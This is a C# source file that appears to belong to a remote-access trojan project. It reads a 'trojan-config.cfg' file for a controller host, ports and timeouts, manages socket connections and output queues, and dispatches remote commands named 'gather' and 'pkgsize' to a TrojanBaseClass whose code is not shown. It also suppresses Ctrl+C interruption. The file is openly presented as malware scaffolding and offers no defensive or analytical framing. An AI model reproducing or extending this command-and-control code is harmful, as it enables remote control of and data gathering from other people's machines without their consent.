using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using Trojan;
using Trojan.exceptions;
using SocketData.operations;
using System.Reflection;
using System.Runtime.InteropServices;

namespace SocketData
{
    public enum ServerStatus
    {
        RUNNING = 0,
        STOPPED = 1,
        IDLE = 2,
        WAITRESPONSE = 3,
        OUTPUTTING = 4,
    }

    public static class CommandExtension
    {
        static List<string> CommandNames = new List<string>
        {
            "gather",
            "pkgsize"
        };

        public static string[] CheckForCommand(string input)
        {
            string[] command_args = input.Split(" ");

            string CommandName = command_args[1];

            for (int i = 0; i < CommandNames.Count(); i++)
            {
                if (CommandName == CommandNames[i])
                {
                    return(command_args);
                }
            }

            return (new string[1] { "" });
        }

        public static string ExecuteCommand(ref socketSetup Connector, ref string[] command_args)
        {
            string CommandName = command_args[1];
            switch(CommandName)
            {
                case("gather"):
                    return(TrojanBaseClass.gather(command_args));
                case("pkgsize"):
                    return(TrojanBaseClass.pkgsize(Connector, command_args));
                default:
                    return("");
            }
        }
    }

    public class ConnectionManager
    {
        public static List<ConnectionSetup> connections = new List<ConnectionSetup>();
        public static Queue<string> DataQueue = new Queue<string>();
        public static string[]? DataArray = null;

        private static string? PrevDataLine = null; 
        public static void OutputDataQueue(bool endchar)
        {
            if (DataQueue.Count > 0)
            {
                Console.WriteLine("\n\n");
                Console.WriteLine("\r##########################################################################################################################################");
                DataArray = DataQueue.ToArray();
                Console.Write("\n\n");
                foreach (string Data in DataArray)
                {
                    string message = "{0}";
                    if (endchar)
                        Console.WriteLine("\n\n" + message, Data, Encoding.UTF8.GetByteCount(Data));
                    else
                        Console.Write(message, Data, Encoding.UTF8.GetByteCount(Data));
                        PrevDataLine = Data;
                    //Console.Write("\t" + new string('*', message.Length + Data.Length - 4));
                    DataQueue.Dequeue();
                }
                Console.WriteLine("\n\n##########################################################################################################################################");

                if (PrevDataLine != null) { PrevDataLine = null; }
            }
        }
    }

    public struct ConnectionSetup
    {
        private readonly Socket _s_conn;
        private byte[] _buffer;
        private ServerStatus _ConnectionStatus = ServerStatus.IDLE;

        public Socket getConn()
        {
            if (_s_conn == null) throw new ExceptionHandler("[-] Connection socket can not be null : " + nameof(_s_conn));
            return(_s_conn);
        }

        public byte[] getBuffer()
        {
            if (_buffer == null) throw new ExceptionHandler("[-] Buffer can not be null : " + nameof(_buffer));
            return(_buffer);
        }

        public void setBuffer(byte[] buffer)
        {
            if (buffer.Length != _buffer.Length) throw new ExceptionHandler("[-] Buffer is not the correct size [1024] : " + nameof(buffer));
            if (buffer == null) throw new ExceptionHandler("[-] Buffer can not be null : " + nameof(buffer));

            _buffer = buffer;
        }

        public EndPoint getRemoteEndPoint()
        {
            if (_s_conn.RemoteEndPoint == null) throw new ExceptionHandler("[-] RemoteEndPoint can not be null : " + nameof(_s_conn.RemoteEndPoint));
            return _s_conn.RemoteEndPoint;
        }

        public ConnectionSetup(Socket s_conn, byte[] buffer)
        {
            _s_conn = s_conn;
            _buffer = buffer;
        }
    }

    public struct socketSetup
    {
        private string _UUID;

        public string getUUID()
        {
            if (_UUID == null) throw new ExceptionHandler("[-] UUID can not be null : " + nameof(_UUID));
            return _UUID;
        }

        private IPEndPoint? _s_EndPoint = null;

        public void setEndPoint(IPEndPoint s_EndPoint)
        {
            if (s_EndPoint == null) throw new ExceptionHandler("[-] EndPoint can not be null : " + nameof(s_EndPoint));
            _s_EndPoint = s_EndPoint;
        }

        public IPEndPoint getEndPoint()
        {
            if (_s_EndPoint == null) throw new ExceptionHandler("[-] EndPoint not set : " + nameof(_s_EndPoint));
            return _s_EndPoint;
        }

        public Socket? sock = null;

        public readonly ushort port;
        public readonly uint buffSize;

        public byte[] buffer;

        public socketSetup(string UUID, ushort port, uint buffSize)
        {
            _UUID = UUID;

            this.port = port;
            this.buffSize = buffSize;

            buffer = new byte[buffSize];
        }
    }

    public class SocketHandler
    {
        private void _StartConsoleHandler()
        {
            Console.CancelKeyPress += new ConsoleCancelEventHandler(CancelEventHandler);
        }

        private void CancelEventHandler(object sender, ConsoleCancelEventArgs CancelEvent)
        {
            CancelEvent.Cancel = true;
        }

        public string TruncationCheckCommand(string command, int startIndex, int length)
        {
            command = command.Substring(startIndex, command.Length - startIndex);
            if (command.Length < length)
            {
                return command;
            }
            return command.Substring(0, length);
        }

        public string RespondToCommand(Socket sock) { return(""); }

        public static string? BasePath = null;

        public static IPAddress? HOST = null;
        public static ushort PORT;
        public static ushort FILE_PORT;
        public static uint BUFFSIZE;

        public static ushort MAX_CONNECTIONS;

        public static int CONNECT_TIMEOUT;
        public static int SEND_TIMEOUT;
        public static int RECEIVE_TIMEOUT;
        public static int EVENT_CHECK_INTERVAL;

        public static string? BUILDFOR;

        protected SocketOperations _SocketOperations = new SocketOperations();
        public ServerStatus ServerStatus = ServerStatus.STOPPED;
        public ServerStatus ReceiverStatus = ServerStatus.IDLE;
        public ServerStatus SenderStatus = ServerStatus.IDLE;

        private byte[] buffer = new byte[BUFFSIZE];

        public SocketHandler()
        {
            if (BasePath == null)
            {
                bool FoundBasePath = false;
                #pragma warning disable CS8600 // Converting null literal or possible null value to non-nullable type.
                string RootPath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

                if (RootPath != null)
                {
                    Environment.CurrentDirectory = RootPath;
                    IEnumerable<string> Directories = Directory.GetDirectories(Environment.CurrentDirectory);

                    while (!FoundBasePath)
                    {
                        FoundBasePath = Directories.Where(directory => directory.EndsWith("Trojan")).Any();
                        if (FoundBasePath)
                        {
                            BasePath = Environment.CurrentDirectory + @"\Trojan";
                            break;
                        }

                        Environment.CurrentDirectory = Path.Combine(Environment.CurrentDirectory, "..");
                        Directories = Directory.GetDirectories(Environment.CurrentDirectory);
                    }
                }
            }

            using (StreamReader ConfigFile = new StreamReader(BasePath + "/trojan-config.cfg"))
            {
                if (ConfigFile == null) throw new ExceptionHandler("Config file not found : " + nameof(ConfigFile));

                string? line;
                string[] LineParts;
                while ((line = ConfigFile.ReadLine()) != null)
                {
                    LineParts = line.Split(" ");
                    switch (LineParts[0])
                    {
                        case "host":
                            HOST = IPAddress.Parse(LineParts[2]);
                            break;
                        case "host_port":
                            PORT = ushort.Parse(LineParts[2]);
                            break;
                        case "file_port":
                            FILE_PORT = ushort.Parse(LineParts[2]);
                            break;
                        case "buffsize":
                            BUFFSIZE = uint.Parse(LineParts[2]);
                            break;
                        case "max_connections":
                            MAX_CONNECTIONS = ushort.Parse(LineParts[2]);
                            break;
                        case "connect_timeout":
                            CONNECT_TIMEOUT = int.Parse(LineParts[2]);
                            break;
                        case "send_timeout":
                            SEND_TIMEOUT = int.Parse(LineParts[2]);
                            break;
                        case "receive_timeout":
                            RECEIVE_TIMEOUT = int.Parse(LineParts[2]);
                            break;
                        case "event_check_interval":
                            EVENT_CHECK_INTERVAL = int.Parse(LineParts[2]);
                            break;
                        case "buildfor":
                            BUILDFOR = LineParts[2];
                            break;
                        default: throw new ExceptionHandler("All values not set in trojan.cfg file : " + nameof(ConfigFile));
                    }
                }
            }

            Task ConsoleHandlerTask = Task.Factory.StartNew(() => _StartConsoleHandler());
        }
    }
}
